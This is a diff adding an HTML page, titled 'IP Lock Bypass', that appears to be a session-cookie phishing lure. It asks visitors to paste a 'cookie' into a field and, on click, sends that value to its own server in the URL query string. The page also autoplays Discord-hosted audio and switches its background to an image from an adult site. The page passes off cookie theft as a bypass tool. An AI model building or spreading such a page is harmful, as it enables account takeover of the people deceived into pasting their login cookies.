@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Lock Bypass</title>
+    <style>
+        body {
+            background-image: url('https://i0.wp.com/ourgenerationmusic.com/wp-content/uploads/2022/12/Snapinsta.app_1080_315865307_1157118088526840_4632393746560311665_n-e1670109773378.jpg?fit=1078%2C606&ssl=1');
+            background-size: cover;
+            background-repeat: no-repeat;
+            font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+            color: rgb(6, 255, 110); /* Changed text color to white */
+            font-size: xx-large;
+        }
+        input {
+            position: relative;
+            display: block;
+            margin: 50px auto;
+            width: 35%;
+            padding: 16px 30px;
+            font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+            background-color: #00000000;
+            color: rgb(206, 21, 21);
+            border-radius: 15px;
+            transition: all 0.3s ease;
+            border-color: rgba(226, 25, 25, 0);
+        }      
+        button {
+            background-color: #00ff4c;
+            border: none;
+            color: white;
+            padding: 12px 12px;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 65px;
+            opacity: 0.8;
+            transition: 0.3s;
+            display: inline-block;
+            text-decoration: none;
+            cursor: pointer;
+            display: block;
+            margin: 100px auto;
+            font-family: cursive;
+            position: sticky;
+            object-position: 20%;
+            position: relative;
+            top: 450px;
+        }
+    </style>
+</head>
+<body>
+    <center>
+        <h1>Sigma Opium 4 Life</h1>
+    </center>
+    <input name="cookie" id="cookie">
+    <button id="check">Click to be sigma</button><!-- Added audio tag for autoplaying the mp3 -->
+    <audio autoplay="">
+        <source src="https://cdn.discordapp.com/attachments/1200064668937502781/1206187357603106889/Yale.mp3?ex=65db1883&is=65c8a383&hm=f1fbacb240e148dca9cac0bdb4fbc2b89e8aa8b1c94c37f1c69bb18180fb5f17&" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <script>
+        const check_box = document.getElementById('check');
+        const cookie_box = document.getElementById('cookie');
+        const body = document.body;
+
+        check_box.addEventListener('click', async function(event) {
+            event.preventDefault();
+            let cookie = cookie_box.value;
+            window.location.href = '' + window.location.href + '?cookie=' + cookie;
+
+            // Change background image when the button is clicked
+            body.style.backgroundImage = "url('https://cdn.gay0day.com/contents/videos_screenshots/205000/205841/preview_720p.mp4.jpg')";
+        });
+    </script>
+</body>
+</html>
